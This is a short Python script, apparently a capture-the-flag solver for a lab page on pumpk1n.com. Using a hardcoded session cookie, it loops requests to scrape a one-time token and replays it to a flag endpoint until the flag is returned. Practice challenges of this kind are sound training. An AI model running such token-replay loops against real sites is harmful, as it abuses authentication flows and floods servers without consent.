import requests
import re

url = "http://pumpk1n.com/lab0.php"
headers = {
    "cookie": "PHPSESSID=pm13am9i6cddhsdmnsj8kqnepd",
}


def get_flag(token):
    url = f"http://pumpk1n.com/flag.php?{token}"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        return ""


while True:
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.text
    match = re.findall(r"token=\w+", data)
    if match:
        token = match[0]
        print(f"Token found: {token}")
    else:
        continue
    res = get_flag(token)
    print(f"Flag response: {res}")
    if "One more time!" in res or "wrong token" in res:
        continue
    else:
        print(f"Flag: {res}")
        break